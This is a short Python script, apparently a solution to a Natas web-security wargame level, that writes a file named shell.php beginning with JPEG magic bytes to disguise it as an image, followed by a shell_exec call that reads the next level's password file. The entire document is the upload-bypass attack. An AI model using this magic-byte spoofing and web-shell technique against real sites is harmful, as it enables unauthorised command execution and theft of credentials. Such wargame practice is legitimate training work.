#!/bin/python
fh = open("shell.php",'w')
fh.write('\xFF\xD8\xFF\xE0' + 'shell_exec("cat /etc/natas_webpass/natas14");')
fh.close()
